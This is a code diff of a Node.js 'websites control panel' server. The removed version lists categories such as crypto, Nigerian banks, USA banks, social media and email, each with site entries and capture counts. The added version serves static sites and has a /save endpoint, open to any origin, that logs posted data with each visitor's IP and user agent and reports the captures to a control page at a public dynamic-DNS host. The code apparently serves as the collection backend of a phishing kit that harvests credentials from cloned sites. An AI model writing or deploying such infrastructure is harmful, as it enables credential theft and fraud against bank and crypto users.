@@ -1,120 +1,226 @@
-const express = require("express");
-const fs = require("fs");
-const path = require("path");
+/**
+ * 80 Websites Control Panel - Node.js Server
+ * Serves static sites + saves captures to data.json
+ *
+ * Run:  node server.js
+ * Then: http://localhost:8080/control.html
+ * Or:   http://pastor.deluxpaid.giize.com:8080/control.html
+ */
 
-const app = express();
-const PORT = process.env.PORT || 3000;
-const DATA_DIR = process.env.DATA_DIR || "/app/data";
-const DATA_FILE = path.join(DATA_DIR, "data.json");
+const http = require('http');
+const fs = require('fs');
+const path = require('path');
+const url = require('url');
 
-fs.mkdirSync(DATA_DIR, { recursive: true });
+const PORT = process.env.PORT || 8080;
+const HOST = '0.0.0.0';
+const BASE_DIR = __dirname;
+const DATA_FILE = path.join(BASE_DIR, 'data.json');
+const LOG_FILE = path.join(BASE_DIR, 'access.log');
 
-const CATEGORIES = [
-  { id: "crypto",        name: "Crypto",           icon: "₿"  },
-  { id: "ng-banks",      name: "Nigerian Banks",   icon: "🇳🇬" },
-  { id: "us-banks",      name: "USA Banks",        icon: "🇺🇸" },
-  { id: "local",         name: "Local Companies",  icon: "🏢" },
-  { id: "social",        name: "Social Media",     icon: "💬" },
-  { id: "email",         name: "Email Tech",       icon: "📧" },
-  { id: "entertainment", name: "Entertainment",    icon: "🎬" },
-  { id: "admin",         name: "Admin Panel",      icon: "🛡️" }
-];
+// ---------- MIME types ----------
+const MIME = {
+  '.html': 'text/html; charset=utf-8',
+  '.css':  'text/css; charset=utf-8',
+  '.js':   'application/javascript; charset=utf-8',
+  '.json': 'application/json; charset=utf-8',
+  '.png':  'image/png',
+  '.jpg':  'image/jpeg',
+  '.jpeg': 'image/jpeg',
+  '.svg':  'image/svg+xml',
+  '.ico':  'image/x-icon',
+  '.txt':  'text/plain; charset=utf-8',
+  '.woff': 'font/woff',
+  '.woff2':'font/woff2',
+};
 
-function buildSeed() {
-  return {
-    version: 1,
-    createdAt: new Date().toISOString(),
-    updatedAt: new Date().toISOString(),
-    categories: CATEGORIES.map(c => ({
-      ...c,
-      websites: Array.from({ length: 30 }, (_, i) => ({
-        id: `${c.id}-${i + 1}`,
-        name: `${c.name} Site ${i + 1}`,
-        url: `https://example-${c.id}-${i + 1}.com`,
-        captures: 0
-      }))
-    })),
-    captures: []
-  };
+// ---------- helpers ----------
+function ensureDataFile() {
+  if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]');
 }
 
-function loadData() {
-  if (!fs.existsSync(DATA_FILE)) {
-    const seed = buildSeed();
-    fs.writeFileSync(DATA_FILE, JSON.stringify(seed, null, 2));
-    return seed;
-  }
+function readData() {
   try {
-    return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
-  } catch {
-    const seed = buildSeed();
-    fs.writeFileSync(DATA_FILE, JSON.stringify(seed, null, 2));
-    return seed;
-  }
+    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+  } catch (e) { return []; }
 }
 
-function saveData(data) {
-  data.updatedAt = new Date().toISOString();
-  const tmp = DATA_FILE + ".tmp";
-  fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
-  fs.renameSync(tmp, DATA_FILE);
+function writeData(arr) {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
+    return true;
+  } catch (e) { console.error('write error', e); return false; }
 }
 
-app.use(express.json());
+function appendLog(line) {
+  try {
+    fs.appendFileSync(LOG_FILE, line + '\n');
+  } catch (e) {}
+}
 
-app.get("/", (req, res) => {
-  const data = loadData();
-  const totalSites = data.categories.reduce((n, c) => n + c.websites.length, 0);
-  res.send(`<!doctype html>
-<html><head><meta charset="utf-8"><title>30 WEBSITES CONTROL PANEL</title>
-<style>
-body{font-family:system-ui;background:#0d1117;color:#c9d1d9;margin:0;padding:2rem}
-h1{color:#58a6ff}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1rem;margin-top:1.5rem}
-.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem}
-.card h3{margin:0 0 .5rem;color:#f0f6fc}
-.big{font-size:2rem;font-weight:700;color:#3fb950}
-.small{color:#8b949e;font-size:.85rem}
-</style></head><body>
-<h1>30 WEBSITES CONTROL PANEL</h1>
-<p class="small">Deploy · Capture · Monitor</p>
-<div class="grid">
-  <div class="card"><h3>Categories</h3><div class="big">${data.categories.length}</div></div>
-  <div class="card"><h3>Websites</h3><div class="big">${totalSites}</div></div>
-  <div class="card"><h3>Captures</h3><div class="big">${data.captures.length}</div></div>
-  <div class="card"><h3>Storage</h3><div class="small">${DATA_FILE}</div></div>
-</div>
-<h2 style="margin-top:2rem;color:#58a6ff">Categories (30 each)</h2>
-<div class="grid">
-${data.categories.map(c => `<div class="card"><h3>${c.icon} ${c.name}</h3><div class="big">${c.websites.length}</div><div class="small">websites</div></div>`).join("")}
-</div>
-</body></html>`);
-});
+function sendJson(res, obj, status = 200) {
+  const body = JSON.stringify(obj);
+  res.writeHead(status, {
+    'Content-Type': 'application/json; charset=utf-8',
+    'Content-Length': Buffer.byteLength(body),
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type',
+    'Cache-Control': 'no-store'
+  });
+  res.end(body);
+}
 
-app.get("/api/data", (req, res) => res.json(loadData()));
+function sendFile(res, filePath) {
+  fs.readFile(filePath, (err, data) => {
+    if (err) {
+      res.writeHead(404, { 'Content-Type': 'text/plain' });
+      res.end('404 Not Found');
+      return;
+    }
+    const ext = path.extname(filePath).toLowerCase();
+    res.writeHead(200, {
+      'Content-Type': MIME[ext] || 'application/octet-stream',
+      'Content-Length': data.length,
+      'Cache-Control': 'no-store'
+    });
+    res.end(data);
+  });
+}
 
-app.get("/api/categories", (req, res) => {
-  const data = loadData();
-  res.json(data.categories.map(c => ({ id: c.id, name: c.name, icon: c.icon, count: c.websites.length })));
-});
+function getClientIp(req) {
+  const xff = req.headers['x-forwarded-for'];
+  if (xff) return xff.split(',')[0].trim();
+  return req.socket.remoteAddress || 'unknown';
+}
 
-app.post("/api/capture", (req, res) => {
-  const { websiteId, note } = req.body || {};
-  const data = loadData();
-  let found = null;
-  for (const c of data.categories) {
-    const w = c.websites.find(x => x.id === websiteId);
-    if (w) { w.captures += 1; found = w; break; }
+// ---------- server ----------
+ensureDataFile();
+
+const server = http.createServer((req, res) => {
+  const parsed = url.parse(req.url, true);
+  const pathname = decodeURIComponent(parsed.pathname);
+  const method = req.method.toUpperCase();
+  const ip = getClientIp(req);
+
+  // Access log
+  appendLog(`${new Date().toISOString()} ${ip} ${method} ${pathname}`);
+
+  // CORS preflight
+  if (method === 'OPTIONS') {
+    res.writeHead(204, {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type'
+    });
+    return res.end();
   }
-  if (!found) return res.status(404).json({ error: "website not found" });
-  const capture = { id: `cap-${Date.now()}`, websiteId, note: note || "", at: new Date().toISOString() };
-  data.captures.push(capture);
-  saveData(data);
-  res.json({ ok: true, capture, website: found });
+
+  // ----- API: GET /data.json -----
+  if (pathname === '/data.json' && method === 'GET') {
+    return sendJson(res, readData());
+  }
+
+  // ----- API: POST /save -----
+  if (pathname === '/save' && method === 'POST') {
+    let body = '';
+    req.on('data', chunk => {
+      body += chunk;
+      if (body.length > 1e6) req.destroy();
+    });
+    req.on('end', () => {
+      try {
+        const payload = JSON.parse(body || '{}');
+        const entry = {
+          id: Date.now().toString() + Math.random().toString(36).slice(2, 8),
+          time: new Date().toISOString(),
+          ip: ip,
+          user_agent: req.headers['user-agent'] || '',
+          site: payload.site || 'unknown',
+          category: payload.category || 'unknown',
+          type: payload.type || 'DATA',
+          data: payload.data || {},
+          page: payload.page || ''
+        };
+        const db = readData();
+        db.unshift(entry);
+        if (db.length > 2000) db.length = 2000;
+        writeData(db);
+        console.log(`📥 [${entry.type}] ${entry.category}/${entry.site} from ${ip}`);
+        sendJson(res, { ok: true, id: entry.id });
+      } catch (e) {
+        sendJson(res, { ok: false, error: String(e) }, 400);
+      }
+    });
+    return;
+  }
+
+  // ----- API: POST /clear -----
+  if (pathname === '/clear' && method === 'POST') {
+    writeData([]);
+    return sendJson(res, { ok: true, message: 'data.json cleared' });
+  }
+
+  // ----- API: GET /stats -----
+  if (pathname === '/stats' && method === 'GET') {
+    const db = readData();
+    const byType = {};
+    const byCategory = {};
+    db.forEach(e => {
+      byType[e.type] = (byType[e.type] || 0) + 1;
+      byCategory[e.category] = (byCategory[e.category] || 0) + 1;
+    });
+    return sendJson(res, {
+      total: db.length,
+      captures: db.filter(e => e.type !== 'VISIT').length,
+      visits: db.filter(e => e.type === 'VISIT').length,
+      by_type: byType,
+      by_category: byCategory,
+      last: db[0] || null
+    });
+  }
+
+  // ----- Static files -----
+  let filePath = pathname === '/' ? '/control.html' : pathname;
+  filePath = path.join(BASE_DIR, filePath);
+
+  // Security: prevent path traversal
+  if (!filePath.startsWith(BASE_DIR)) {
+    res.writeHead(403); return res.end('Forbidden');
+  }
+
+  fs.stat(filePath, (err, stat) => {
+    if (err) return sendFile(res, filePath);
+    if (stat.isDirectory()) {
+      // try index.html
+      const idx = path.join(filePath, 'index.html');
+      fs.stat(idx, (e2, s2) => {
+        if (!e2 && s2.isFile()) sendFile(res, idx);
+        else sendFile(res, path.join(filePath, 'index.html'));
+      });
+      return;
+    }
+    sendFile(res, filePath);
+  });
 });
 
-app.listen(PORT, () => {
-  console.log(`Control panel running on :${PORT}`);
-  console.log(`Data file: ${DATA_FILE}`);
-  loadData();
+server.listen(PORT, HOST, () => {
+  console.log('');
+  console.log('  ╔══════════════════════════════════════════════════╗');
+  console.log('  ║     80 WEBSITES CONTROL PANEL · Node.js         ║');
+  console.log('  ╚══════════════════════════════════════════════════╝');
+  console.log('');
+  console.log(`  🚀 Server running on http://${HOST}:${PORT}`);
+  console.log(`  🌐 Control panel:  http://localhost:${PORT}/control.html`);
+  console.log(`  📊 Data file:      ${DATA_FILE}`);
+  console.log(`  📝 Access log:     ${LOG_FILE}`);
+  console.log('');
+  console.log('  Public:  http://pastor.deluxpaid.giize.com:' + PORT + '/control.html');
+  console.log('  Press CTRL+C to stop');
+  console.log('');
+});
+
+process.on('SIGINT', () => {
+  console.log('\n👋 Server stopped');
+  process.exit(0);
 });
